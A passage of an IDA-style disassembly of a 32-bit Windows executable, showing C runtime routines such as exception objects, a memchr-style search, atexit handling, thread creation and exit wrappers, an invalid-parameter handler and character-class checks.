loc_40E635:                             ; CODE XREF: sub_40E5DA+32↑j
                pop     esi
                pop     ebp
                retn
sub_40E5DA      endp


; =============== S U B R O U T I N E =======================================


sub_40E638      proc near               ; CODE XREF: sub_4010D0+28↑p
                mov     eax, ecx
                and     dword ptr [eax+4], 0
                and     dword ptr [eax+8], 0
                mov     dword ptr [eax], offset off_4202B8
                retn
sub_40E638      endp


; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_40E649      proc near               ; CODE XREF: sub_409DC0+3B↑p
                                        ; sub_409FA0+3F↑p ...

arg_0           = dword ptr  8

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                push    ebx
                mov     ebx, [ebp+arg_0]
                push    esi
                push    edi
                mov     edi, ecx
                mov     dword ptr [edi], offset off_4202B8
                mov     eax, [ebx]
                test    eax, eax
                jz      short loc_40E688
                push    eax
                call    sub_4102A0
                mov     esi, eax
                inc     esi
                push    esi
                call    sub_40FE32
                pop     ecx
                pop     ecx
                mov     [edi+4], eax
                test    eax, eax
                jz      short loc_40E68C
                push    dword ptr [ebx]
                push    esi
                push    eax
                call    sub_4128F1
                add     esp, 0Ch
                jmp     short loc_40E68C
; ---------------------------------------------------------------------------

loc_40E688:                             ; CODE XREF: sub_40E649+17↑j
                and     dword ptr [edi+4], 0

loc_40E68C:                             ; CODE XREF: sub_40E649+2F↑j
                                        ; sub_40E649+3D↑j
                mov     dword ptr [edi+8], 1
                mov     eax, edi
                pop     edi
                pop     esi
                pop     ebx
                pop     ebp
                retn    4
sub_40E649      endp


; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_40E69C      proc near               ; CODE XREF: sub_40F934+C↓p

arg_0           = dword ptr  8

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                mov     eax, ecx
                mov     ecx, [ebp+arg_0]
                mov     dword ptr [eax], offset off_4202B8
                mov     ecx, [ecx]
                and     dword ptr [eax+8], 0
                mov     [eax+4], ecx
                pop     ebp
                retn    8
sub_40E69C      endp


; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_40E6B9      proc near               ; CODE XREF: sub_401240+2E↑p
                                        ; sub_40B030+8↑p ...

arg_0           = dword ptr  8

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                push    ebx
                mov     ebx, [ebp+arg_0]
                push    esi
                mov     esi, ecx
                mov     dword ptr [esi], offset off_4202B8
                mov     eax, [ebx+8]
                mov     [esi+8], eax
                test    eax, eax
                mov     eax, [ebx+4]
                push    edi
                jz      short loc_40E70A
                test    eax, eax
                jz      short loc_40E704
                push    eax
                call    sub_4102A0
                mov     edi, eax
                inc     edi
                push    edi
                call    sub_40FE32
                pop     ecx
                pop     ecx
                mov     [esi+4], eax
                test    eax, eax
                jz      short loc_40E70D
                push    dword ptr [ebx+4]
                push    edi
                push    eax
                call    sub_4128F1
                add     esp, 0Ch
                jmp     short loc_40E70D
; ---------------------------------------------------------------------------

loc_40E704:                             ; CODE XREF: sub_40E6B9+22↑j
                and     dword ptr [esi+4], 0
                jmp     short loc_40E70D
; ---------------------------------------------------------------------------

loc_40E70A:                             ; CODE XREF: sub_40E6B9+1E↑j
                mov     [esi+4], eax

loc_40E70D:                             ; CODE XREF: sub_40E6B9+3A↑j
                                        ; sub_40E6B9+49↑j ...
                pop     edi
                mov     eax, esi
                pop     esi
                pop     ebx
                pop     ebp
                retn    4
sub_40E6B9      endp


; =============== S U B R O U T I N E =======================================


sub_40E716      proc near               ; CODE XREF: sub_401000+6↑j
                                        ; sub_401010+9↑p ...
                cmp     dword ptr [ecx+8], 0
                mov     dword ptr [ecx], offset off_4202B8
                jz      short locret_40E72B
                push    dword ptr [ecx+4] ; lpMem
                call    sub_40FD55
                pop     ecx

locret_40E72B:                          ; CODE XREF: sub_40E716+A↑j
                retn
sub_40E716      endp


; =============== S U B R O U T I N E =======================================


sub_40E72C      proc near               ; DATA XREF: .rdata:00420264↓o
                                        ; .rdata:004202BC↓o ...
                mov     eax, [ecx+4]
                test    eax, eax
                jnz     short locret_40E738
                mov     eax, offset aUnknownExcepti ; "Unknown exception"

locret_40E738:                          ; CODE XREF: sub_40E72C+5↑j
                retn
sub_40E72C      endp


; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_40E739      proc near               ; DATA XREF: .rdata:off_4202B8↓o

arg_0           = byte ptr  8

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                push    esi
                mov     esi, ecx
                call    sub_40E716
                test    [ebp+arg_0], 1
                jz      short loc_40E753
                push    esi
                call    sub_40F15B
                pop     ecx

loc_40E753:                             ; CODE XREF: sub_40E739+11↑j
                mov     eax, esi
                pop     esi
                pop     ebp
                retn    4
sub_40E739      endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================


sub_40E760      proc near               ; CODE XREF: sub_408D80+4E↑p
                                        ; sub_408D80+81↑p

arg_0           = dword ptr  4
arg_4           = byte ptr  8
arg_8           = dword ptr  0Ch

                mov     eax, [esp+arg_8]
                push    ebx
                test    eax, eax
                jz      short loc_40E7BB
                mov     edx, [esp+4+arg_0]
                xor     ebx, ebx
                mov     bl, [esp+4+arg_4]
                test    edx, 3
                jz      short loc_40E791

loc_40E77B:                             ; CODE XREF: sub_40E760+2F↓j
                mov     cl, [edx]
                add     edx, 1
                xor     cl, bl
                jz      short loc_40E7F6
                sub     eax, 1
                jz      short loc_40E7BB
                test    edx, 3
                jnz     short loc_40E77B

loc_40E791:                             ; CODE XREF: sub_40E760+19↑j
                sub     eax, 4
                jb      short loc_40E7A8
                push    edi
                mov     edi, ebx
                shl     ebx, 8
                add     ebx, edi
                mov     edi, ebx
                shl     ebx, 10h
                add     ebx, edi
                jmp     short loc_40E7C2
; ---------------------------------------------------------------------------

loc_40E7A7:                             ; CODE XREF: sub_40E760+60↓j
                pop     edi

loc_40E7A8:                             ; CODE XREF: sub_40E760+34↑j
                add     eax, 4
                jz      short loc_40E7BB

loc_40E7AD:                             ; CODE XREF: sub_40E760+59↓j
                mov     cl, [edx]
                add     edx, 1
                xor     cl, bl
                jz      short loc_40E7F6
                sub     eax, 1
                jnz     short loc_40E7AD

loc_40E7BB:                             ; CODE XREF: sub_40E760+7↑j
                                        ; sub_40E760+27↑j ...
                pop     ebx
                retn
; ---------------------------------------------------------------------------

loc_40E7BD:                             ; CODE XREF: sub_40E760+7B↓j
                                        ; sub_40E760+93↓j
                sub     eax, 4
                jb      short loc_40E7A7

loc_40E7C2:                             ; CODE XREF: sub_40E760+45↑j
                mov     ecx, [edx]
                xor     ecx, ebx
                mov     edi, 7EFEFEFFh
                add     edi, ecx
                xor     ecx, 0FFFFFFFFh
                xor     ecx, edi
                add     edx, 4
                and     ecx, 81010100h
                jz      short loc_40E7BD
                mov     ecx, [edx-4]
                xor     cl, bl
                jz      short loc_40E807
                xor     ch, bl
                jz      short loc_40E801
                shr     ecx, 10h
                xor     cl, bl
                jz      short loc_40E7FB
                xor     ch, bl
                jz      short loc_40E7F5
                jmp     short loc_40E7BD
; ---------------------------------------------------------------------------

loc_40E7F5:                             ; CODE XREF: sub_40E760+91↑j
                pop     edi

loc_40E7F6:                             ; CODE XREF: sub_40E760+22↑j
                                        ; sub_40E760+54↑j
                lea     eax, [edx-1]
                pop     ebx
                retn
; ---------------------------------------------------------------------------

loc_40E7FB:                             ; CODE XREF: sub_40E760+8D↑j
                lea     eax, [edx-2]
                pop     edi
                pop     ebx
                retn
; ---------------------------------------------------------------------------

loc_40E801:                             ; CODE XREF: sub_40E760+86↑j
                lea     eax, [edx-3]
                pop     edi
                pop     ebx
                retn
; ---------------------------------------------------------------------------

loc_40E807:                             ; CODE XREF: sub_40E760+82↑j
                lea     eax, [edx-4]
                pop     edi
                pop     ebx
                retn
sub_40E760      endp


; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_40E80D      proc near               ; CODE XREF: sub_40E823+6↓j
                                        ; sub_41CA3A+37↓p

arg_0           = dword ptr  8

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                push    0Ah
                push    0
                push    [ebp+arg_0]
                call    sub_412B88
                add     esp, 0Ch
                pop     ebp
                retn
sub_40E80D      endp


; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_40E823      proc near               ; CODE XREF: sub_405850+8B↑p
                                        ; sub_4059A0+D2↑p ...
                mov     edi, edi
                push    ebp
                mov     ebp, esp
                pop     ebp
                jmp     sub_40E80D
sub_40E823      endp


; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_40E82E      proc near               ; CODE XREF: sub_40E919+18↓p

lpMem           = dword ptr -4
arg_0           = dword ptr  8

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                push    ecx
                push    ebx
                push    esi
                push    edi
                push    dword_42DB30
                call    sub_41217C
                push    dword_42DB2C
                mov     edi, eax
                mov     [ebp+lpMem], edi
                call    sub_41217C
                mov     esi, eax
                pop     ecx
                pop     ecx
                cmp     esi, edi
                jb      loc_40E8E1
                mov     ebx, esi
                sub     ebx, edi
                lea     eax, [ebx+4]
                cmp     eax, 4
                jb      short loc_40E8E1
                push    edi             ; lpMem
                call    sub_412C92
                mov     edi, eax
                lea     eax, [ebx+4]
                pop     ecx
                cmp     edi, eax
                jnb     short loc_40E8C2
                mov     eax, 800h
                cmp     edi, eax
                jnb     short loc_40E885
                mov     eax, edi

loc_40E885:                             ; CODE XREF: sub_40E82E+53↑j
                add     eax, edi
                cmp     eax, edi
                jb      short loc_40E89A
                push    eax             ; dwBytes
                push    [ebp+lpMem]     ; lpMem
                call    sub_412C44
                pop     ecx
                pop     ecx
                test    eax, eax
                jnz     short loc_40E8B0

loc_40E89A:                             ; CODE XREF: sub_40E82E+5B↑j
                lea     eax, [edi+10h]
                cmp     eax, edi
                jb      short loc_40E8E1
                push    eax             ; dwBytes
                push    [ebp+lpMem]     ; lpMem
                call    sub_412C44
                pop     ecx
                pop     ecx
                test    eax, eax
                jz      short loc_40E8E1

loc_40E8B0:                             ; CODE XREF: sub_40E82E+6A↑j
                sar     ebx, 2
                push    eax
                lea     esi, [eax+ebx*4]
                call    sub_412101
                pop     ecx
                mov     dword_42DB30, eax

loc_40E8C2:                             ; CODE XREF: sub_40E82E+4A↑j
                push    [ebp+arg_0]
                call    sub_412101
                mov     [esi], eax
                add     esi, 4
                push    esi
                call    sub_412101
                pop     ecx
                mov     dword_42DB2C, eax
                mov     eax, [ebp+arg_0]
                pop     ecx
                jmp     short loc_40E8E3
; ---------------------------------------------------------------------------

loc_40E8E1:                             ; CODE XREF: sub_40E82E+2A↑j
                                        ; sub_40E82E+3A↑j ...
                xor     eax, eax

loc_40E8E3:                             ; CODE XREF: sub_40E82E+B1↑j
                pop     edi
                pop     esi
                pop     ebx
                leave
                retn
sub_40E82E      endp

; ---------------------------------------------------------------------------
byte_40E8E8     db 8Bh, 0FFh            ; DATA XREF: .rdata:00420204↓o
; ---------------------------------------------------------------------------
                push    esi
                push    4
                push    20h
                call    sub_412BF8
                mov     esi, eax
                push    esi
                call    sub_412101
                add     esp, 0Ch
                mov     dword_42DB30, eax
                mov     dword_42DB2C, eax
                test    esi, esi
                jnz     short loc_40E912
                push    18h
                pop     eax
                pop     esi
                retn
; ---------------------------------------------------------------------------

loc_40E912:                             ; CODE XREF: .text:0040E90B↑j
                and     dword ptr [esi], 0
                xor     eax, eax
                pop     esi
                retn

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_40E919      proc near               ; CODE XREF: sub_40E955+8↓p

var_1C          = dword ptr -1Ch
ms_exc          = CPPEH_RECORD ptr -18h
arg_0           = dword ptr  8

                push    0Ch
                push    offset stru_422C08
                call    __SEH_prolog4
                call    sub_412DD1
                and     [ebp+ms_exc.registration.TryLevel], 0
                push    [ebp+arg_0]
                call    sub_40E82E
                pop     ecx
                mov     [ebp+var_1C], eax
                mov     [ebp+ms_exc.registration.TryLevel], 0FFFFFFFEh
                call    loc_40E94F
; ---------------------------------------------------------------------------

loc_40E946:                             ; CODE XREF: sub_40E919+3B↓j
                mov     eax, [ebp+var_1C]
                call    __SEH_epilog4
                retn
; ---------------------------------------------------------------------------

loc_40E94F:                             ; CODE XREF: sub_40E919+28↑j
                                        ; DATA XREF: .rdata:stru_422C08↓o
                call    sub_412DDA
                retn
sub_40E919      endp


; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_40E955      proc near               ; CODE XREF: sub_40F94F+47↓p
                                        ; sub_412E24+46↓p ...

arg_0           = dword ptr  8

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                push    [ebp+arg_0]
                call    sub_40E919
                neg     eax
                sbb     eax, eax
                neg     eax
                pop     ecx
                dec     eax
                pop     ebp
                retn
sub_40E955      endp


; =============== S U B R O U T I N E =======================================

; Attributes: noreturn bp-based frame

; void __cdecl __noreturn sub_40E96C(DWORD dwExitCode)
sub_40E96C      proc near               ; CODE XREF: sub_40E9A9+1C↓p

dwExitCode      = dword ptr  8

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                cmp     ds:off_420530, 0
                jz      short loc_40E98F
                push    offset off_420530
                call    sub_4132F0
                pop     ecx
                test    eax, eax
                jz      short loc_40E98F
                call    ds:off_420530

loc_40E98F:                             ; CODE XREF: sub_40E96C+C↑j
                                        ; sub_40E96C+1B↑j
                call    sub_41238C
                test    eax, eax
                jz      short loc_40E99F
                push    eax             ; lpMem
                call    sub_41254E
                pop     ecx

loc_40E99F:                             ; CODE XREF: sub_40E96C+2A↑j
                push    [ebp+dwExitCode] ; dwExitCode
                call    ds:ExitThread
sub_40E96C      endp

; ---------------------------------------------------------------------------
                db 0CCh

; =============== S U B R O U T I N E =======================================

; Attributes: noreturn bp-based frame

sub_40E9A9      proc near               ; CODE XREF: StartAddress:loc_40EA67↓p

uExitCode       = dword ptr -1Ch
ms_exc          = CPPEH_RECORD ptr -18h

                push    0Ch
                push    offset stru_422C28
                call    __SEH_prolog4
                call    sub_412405
                and     [ebp+ms_exc.registration.TryLevel], 0
                push    dword ptr [eax+58h]
                call    dword ptr [eax+54h]
                push    eax             ; dwExitCode
                call    sub_40E96C
; ---------------------------------------------------------------------------
unk_40E9CA      db  8Bh ; ‹             ; DATA XREF: .rdata:stru_422C28↓o
                db  45h ; E
                db 0ECh ; ì
                db  8Bh ; ‹
                db    8
                db  8Bh ; ‹
                db    9
                db  89h ; ‰
                db  4Dh ; M
                db 0E4h ; ä
                db  50h ; P
                db  51h ; Q
                db 0E8h ; è
                db 0D2h ; Ò
                db  49h ; I
                db    0
                db    0
                db  59h ; Y
                db  59h ; Y
                db 0C3h ; Ã
; ---------------------------------------------------------------------------

loc_40E9DE:                             ; DATA XREF: .rdata:stru_422C28↓o
                mov     esp, [ebp+ms_exc.old_esp]
                push    [ebp+uExitCode] ; uExitCode
                call    sub_412FEB
                int     3               ; Trap to Debugger
sub_40E9A9      endp


; =============== S U B R O U T I N E =======================================

; Attributes: noreturn bp-based frame

; DWORD __stdcall StartAddress(LPVOID lpThreadParameter)
StartAddress    proc near               ; DATA XREF: sub_40EA6D+76↓o

lpThreadParameter= dword ptr  8

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                push    esi
                call    sub_412217
                call    sub_412211
                push    eax
                call    sub_4121F7
                test    eax, eax
                jnz     short loc_40EA2E
                mov     esi, [ebp+lpThreadParameter]
                push    esi
                call    sub_412211
                push    eax
                call    sub_41224B
                test    eax, eax
                jnz     short loc_40EA24
                call    ds:GetLastError
                push    eax             ; dwExitCode
                call    ds:ExitThread
; ---------------------------------------------------------------------------

loc_40EA24:                             ; CODE XREF: StartAddress+2B↑j
                call    ds:GetCurrentThreadId
                mov     [esi], eax
                jmp     short loc_40EA49
; ---------------------------------------------------------------------------

loc_40EA2E:                             ; CODE XREF: StartAddress+18↑j
                mov     ecx, [ebp+lpThreadParameter]
                mov     edx, [ecx+54h]
                mov     [eax+54h], edx
                mov     edx, [ecx+58h]
                mov     [eax+58h], edx
                mov     edx, [ecx+4]
                push    ecx             ; lpMem
                mov     [eax+4], edx
                call    sub_41241F

loc_40EA49:                             ; CODE XREF: StartAddress+42↑j
                cmp     ds:off_42052C, 0
                jz      short loc_40EA67
                push    offset off_42052C
                call    sub_4132F0
                pop     ecx
                test    eax, eax
                jz      short loc_40EA67
                call    ds:off_42052C

loc_40EA67:                             ; CODE XREF: StartAddress+66↑j
                                        ; StartAddress+75↑j
                call    sub_40E9A9
StartAddress    endp

; ---------------------------------------------------------------------------
                db 0CCh

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

; int __cdecl sub_40EA6D(LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, int, int, DWORD dwCreationFlags, LPDWORD lpThreadId)
sub_40EA6D      proc near               ; CODE XREF: sub_401AE0+128↑p
                                        ; sub_401AE0+141↑p ...

var_4           = dword ptr -4
lpThreadAttributes= dword ptr  8
dwStackSize     = dword ptr  0Ch
arg_8           = dword ptr  10h
arg_C           = dword ptr  14h
dwCreationFlags = dword ptr  18h
lpThreadId      = dword ptr  1Ch

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                push    ecx
                push    ebx
                push    edi
                mov     edi, [ebp+arg_8]
                xor     ebx, ebx
                mov     [ebp+var_4], ebx
                cmp     edi, ebx
                jnz     short loc_40EA9D
                call    sub_41090E
                push    ebx
                push    ebx
                push    ebx
                push    ebx
                push    ebx
                mov     dword ptr [eax], 16h
                call    sub_40EC54
                add     esp, 14h
                xor     eax, eax
                jmp     short loc_40EB19
; ---------------------------------------------------------------------------

loc_40EA9D:                             ; CODE XREF: sub_40EA6D+12↑j
                push    esi
                call    sub_412217
                push    214h
                push    1
                call    sub_412BF8
                mov     esi, eax
                pop     ecx
                pop     ecx
                cmp     esi, ebx
                jz      short loc_40EB01
                call    sub_412405
                push    dword ptr [eax+6Ch]
                push    esi
                call    sub_4122A5
                mov     eax, [ebp+arg_C]
                or      dword ptr [esi+4], 0FFFFFFFFh
                mov     [esi+58h], eax
                mov     eax, [ebp+lpThreadId]
                pop     ecx
                pop     ecx
                mov     [esi+54h], edi
                cmp     eax, ebx
                jnz     short loc_40EADE
                lea     eax, [ebp+arg_8]

loc_40EADE:                             ; CODE XREF: sub_40EA6D+6C↑j
                push    eax             ; lpThreadId
                push    [ebp+dwCreationFlags] ; dwCreationFlags
                push    esi             ; lpParameter
                push    offset StartAddress ; lpStartAddress
                push    [ebp+dwStackSize] ; dwStackSize
                push    [ebp+lpThreadAttributes] ; lpThreadAttributes
                call    ds:CreateThread
                cmp     eax, ebx
                jnz     short loc_40EB18
                call    ds:GetLastError
                mov     [ebp+var_4], eax

loc_40EB01:                             ; CODE XREF: sub_40EA6D+48↑j
                push    esi             ; lpMem
                call    sub_40FD55
                pop     ecx
                cmp     [ebp+var_4], ebx
                jz      short loc_40EB16
                push    [ebp+var_4]
                call    sub_410934
                pop     ecx

loc_40EB16:                             ; CODE XREF: sub_40EA6D+9E↑j
                xor     eax, eax

loc_40EB18:                             ; CODE XREF: sub_40EA6D+89↑j
                pop     esi

loc_40EB19:                             ; CODE XREF: sub_40EA6D+2E↑j
                pop     edi
                pop     ebx
                leave
                retn
sub_40EA6D      endp


; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_40EB1D      proc near               ; CODE XREF: sub_41301F+17↓p

arg_0           = dword ptr  8

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                mov     eax, [ebp+arg_0]
                mov     dword_42AAC0, eax
                pop     ebp
                retn
sub_40EB1D      endp


; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_40EB2C      proc near               ; CODE XREF: sub_40EC54+21↓j
                                        ; sub_41740A+87↓p ...

var_328         = dword ptr -328h
var_324         = dword ptr -324h
var_31C         = dword ptr -31Ch
ExceptionInfo   = _EXCEPTION_POINTERS ptr -2D8h
var_2D0         = dword ptr -2D0h
var_244         = word ptr -244h
var_240         = word ptr -240h
var_23C         = word ptr -23Ch
var_238         = word ptr -238h
var_234         = dword ptr -234h
var_230         = dword ptr -230h
var_22C         = dword ptr -22Ch
var_228         = dword ptr -228h
var_224         = dword ptr -224h
var_220         = dword ptr -220h
var_21C         = dword ptr -21Ch
var_218         = dword ptr -218h
var_214         = word ptr -214h
var_210         = dword ptr -210h
var_20C         = dword ptr -20Ch
var_208         = word ptr -208h
var_4           = dword ptr -4

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                sub     esp, 328h
                mov     eax, ___security_cookie
                xor     eax, ebp
                mov     [ebp+var_4], eax
                and     [ebp+var_328], 0
                push    ebx
                push    4Ch
                lea     eax, [ebp+var_324]
                push    0
                push    eax
                call    sub_413520
                lea     eax, [ebp+var_328]
                mov     [ebp+ExceptionInfo.ExceptionRecord], eax
                lea     eax, [ebp+var_2D0]
                add     esp, 0Ch
                mov     [ebp+ExceptionInfo.ContextRecord], eax
                mov     [ebp+var_220], eax
                mov     [ebp+var_224], ecx
                mov     [ebp+var_228], edx
                mov     [ebp+var_22C], ebx
                mov     [ebp+var_230], esi
                mov     [ebp+var_234], edi
                mov     [ebp+var_208], ss
                mov     [ebp+var_214], cs
                mov     [ebp+var_238], ds
                mov     [ebp+var_23C], es
                mov     [ebp+var_240], fs
                mov     [ebp+var_244], gs
                pushf
                pop     [ebp+var_210]
                mov     eax, [ebp+4]
                lea     ecx, [ebp+4]
                mov     [ebp+var_2D0], 10001h
                mov     [ebp+var_218], eax
                mov     [ebp+var_20C], ecx
                mov     ecx, [ecx-4]
                mov     [ebp+var_21C], ecx
                mov     [ebp+var_328], 0C0000417h
                mov     [ebp+var_324], 1
                mov     [ebp+var_31C], eax
                call    ds:IsDebuggerPresent
                push    0               ; lpTopLevelExceptionFilter
                mov     ebx, eax
                call    ds:SetUnhandledExceptionFilter
                lea     eax, [ebp+ExceptionInfo]
                push    eax             ; ExceptionInfo
                call    ds:UnhandledExceptionFilter
                test    eax, eax
                jnz     short loc_40EC35
                test    ebx, ebx
                jnz     short loc_40EC35
                push    2
                call    sub_41350D
                pop     ecx

loc_40EC35:                             ; CODE XREF: sub_40EB2C+FB↑j
                                        ; sub_40EB2C+FF↑j
                push    0C0000417h      ; uExitCode
                call    ds:GetCurrentProcess
                push    eax             ; hProcess
                call    ds:TerminateProcess
                mov     ecx, [ebp+var_4]
                xor     ecx, ebp
                pop     ebx
                call    @__security_check_cookie@4 ; __security_check_cookie(x)
                leave
                retn
sub_40EB2C      endp


; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_40EC54      proc near               ; CODE XREF: sub_40E31F+24↑p
                                        ; sub_40E37C+20↑p ...
                mov     edi, edi
                push    ebp
                mov     ebp, esp
                push    dword_42AAC0
                call    sub_41217C
                pop     ecx
                test    eax, eax
                jz      short loc_40EC6C
                pop     ebp
                jmp     eax
; ---------------------------------------------------------------------------

loc_40EC6C:                             ; CODE XREF: sub_40EC54+13↑j
                push    2
                call    sub_41350D
                pop     ecx
                pop     ebp
                jmp     sub_40EB2C
sub_40EC54      endp


; =============== S U B R O U T I N E =======================================


sub_40EC7A      proc near               ; CODE XREF: sub_4027B0+9A↑p
                                        ; sub_4027B0+AA↑p ...
                xor     eax, eax
                push    eax
                push    eax
                push    eax
                push    eax
                push    eax
                call    sub_40EC54
                add     esp, 14h
                retn
sub_40EC7A      endp


; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_40EC8A      proc near               ; CODE XREF: sub_40ED4E+D↓p

var_1C          = dword ptr -1Ch
ms_exc          = CPPEH_RECORD ptr -18h
arg_0           = dword ptr  8
arg_4           = dword ptr  0Ch
arg_8           = dword ptr  10h

                push    0Ch
                push    offset stru_422C48
                call    __SEH_prolog4
                xor     ebx, ebx
                mov     [ebp+var_1C], ebx
                xor     eax, eax
                mov     edi, [ebp+arg_0]
                cmp     edi, ebx
                setnz   al
                cmp     eax, ebx
                jnz     short loc_40ECC5

loc_40ECA9:                             ; CODE XREF: sub_40EC8A+47↓j
                                        ; sub_40EC8A+52↓j
                call    sub_41090E
                mov     dword ptr [eax], 16h
                push    ebx
                push    ebx
                push    ebx
                push    ebx
                push    ebx
                call    sub_40EC54
                add     esp, 14h

loc_40ECC1:                             ; CODE XREF: sub_40EC8A+6B↓j
                                        ; sub_40EC8A+92↓j
                xor     eax, eax
                jmp     short loc_40ED3E
; ---------------------------------------------------------------------------

loc_40ECC5:                             ; CODE XREF: sub_40EC8A+1D↑j
                xor     eax, eax
                mov     esi, [ebp+arg_4]
                cmp     esi, ebx
                setnz   al
                cmp     eax, ebx
                jz      short loc_40ECA9
                xor     eax, eax
                cmp     [esi], bl
                setnz   al
                cmp     eax, ebx
                jz      short loc_40ECA9
                call    sub_413A18
                mov     [ebp+arg_0], eax
                cmp     eax, ebx
                jnz     short loc_40ECF7
                call    sub_41090E
                mov     dword ptr [eax], 18h
                jmp     short loc_40ECC1
; ---------------------------------------------------------------------------

loc_40ECF7:                             ; CODE XREF: sub_40EC8A+5E↑j
                mov     [ebp+ms_exc.registration.TryLevel], ebx
                cmp     [edi], bl
                jnz     short loc_40ED1E
                call    sub_41090E
                mov     dword ptr [eax], 16h
                push    0FFFFFFFEh
                lea     eax, [ebp+ms_exc.registration]
                push    eax
                push    offset ___security_cookie
                call    sub_413B50
                add     esp, 0Ch
                jmp     short loc_40ECC1
; ---------------------------------------------------------------------------

loc_40ED1E:                             ; CODE XREF: sub_40EC8A+72↑j
                push    eax
                push    [ebp+arg_8]
                push    esi
                push    edi
                call    sub_41374F
                add     esp, 10h
                mov     [ebp+var_1C], eax
                mov     [ebp+ms_exc.registration.TryLevel], 0FFFFFFFEh
                call    loc_40ED44
; ---------------------------------------------------------------------------

loc_40ED3B:                             ; CODE XREF: sub_40EC8A+C3↓j
                mov     eax, [ebp+var_1C]

loc_40ED3E:                             ; CODE XREF: sub_40EC8A+39↑j
                call    __SEH_epilog4
                retn
; ---------------------------------------------------------------------------

loc_40ED44:                             ; CODE XREF: sub_40EC8A+AC↑j
                                        ; DATA XREF: .rdata:stru_422C48↓o
                push    [ebp+arg_0]
                call    sub_4136E4
                pop     ecx
                retn
sub_40EC8A      endp


; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_40ED4E      proc near               ; CODE XREF: .text:0040333A↑p
                                        ; .text:0040338A↑p ...

arg_0           = dword ptr  8
arg_4           = dword ptr  0Ch

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                push    40h
                push    [ebp+arg_4]
                push    [ebp+arg_0]
                call    sub_40EC8A
                add     esp, 0Ch
                pop     ebp
                retn
sub_40ED4E      endp


; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_40ED65      proc near               ; CODE XREF: sub_40EDBB+27↓p

var_10          = dword ptr -10h
var_8           = dword ptr -8
var_4           = byte ptr -4
arg_0           = dword ptr  8
arg_4           = dword ptr  0Ch

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                sub     esp, 10h
                push    [ebp+arg_4]
                lea     ecx, [ebp+var_10]
                call    sub_40E461
                mov     eax, [ebp+var_10]
                cmp     dword ptr [eax+0ACh], 1
                jle     short loc_40ED9A
                lea     eax, [ebp+var_10]
                push    eax
                push    103h
                push    [ebp+arg_0]
                call    sub_413CA3
                add     esp, 0Ch
                jmp     short loc_40EDAC
; ---------------------------------------------------------------------------

loc_40ED9A:                             ; CODE XREF: sub_40ED65+1D↑j
                mov     eax, [eax+0C8h]
                mov     ecx, [ebp+arg_0]
                movzx   eax, word ptr [eax+ecx*2]
                and     eax, 103h

loc_40EDAC:                             ; CODE XREF: sub_40ED65+33↑j
                cmp     [ebp+var_4], 0
                jz      short locret_40EDB9
                mov     ecx, [ebp+var_8]
                and     dword ptr [ecx+70h], 0FFFFFFFDh

locret_40EDB9:                          ; CODE XREF: sub_40ED65+4B↑j
                leave
                retn
sub_40ED65      endp


; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_40EDBB      proc near               ; CODE XREF: sub_401AE0+191↑p
                                        ; sub_407110+7C↑p

arg_0           = dword ptr  8

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                cmp     dword_42AE20, 0
                jnz     short loc_40EDDD
                mov     eax, [ebp+arg_0]
                mov     ecx, off_4257B8
                movzx   eax, word ptr [ecx+eax*2]
                and     eax, 103h
                pop     ebp
                retn
; ---------------------------------------------------------------------------

loc_40EDDD:                             ; CODE XREF: sub_40EDBB+C↑j
                push    0
                push    [ebp+arg_0]
                call    sub_40ED65
                pop     ecx
                pop     ecx
                pop     ebp
                retn
sub_40EDBB      endp


; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_40EDEB      proc near               ; CODE XREF: sub_40EE3C+25↓p

var_10          = dword ptr -10h
var_8           = dword ptr -8
var_4           = byte ptr -4
arg_0           = dword ptr  8
arg_4           = dword ptr  0Ch

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                sub     esp, 10h
                push    [ebp+arg_4]
                lea     ecx, [ebp+var_10]
                call    sub_40E461
                mov     eax, [ebp+var_10]
                cmp     dword ptr [eax+0ACh], 1
                jle     short loc_40EE1D
                lea     eax, [ebp+var_10]
                push    eax
                push    4
                push    [ebp+arg_0]
                call    sub_413CA3
                add     esp, 0Ch
                jmp     short loc_40EE2D
; ---------------------------------------------------------------------------

loc_40EE1D:                             ; CODE XREF: sub_40EDEB+1D↑j
                mov     eax, [eax+0C8h]
                mov     ecx, [ebp+arg_0]
                movzx   eax, word ptr [eax+ecx*2]
                and     eax, 4

loc_40EE2D:                             ; CODE XREF: sub_40EDEB+30↑j
                cmp     [ebp+var_4], 0
                jz      short locret_40EE3A
                mov     ecx, [ebp+var_8]
                and     dword ptr [ecx+70h], 0FFFFFFFDh

locret_40EE3A:                          ; CODE XREF: sub_40EDEB+46↑j
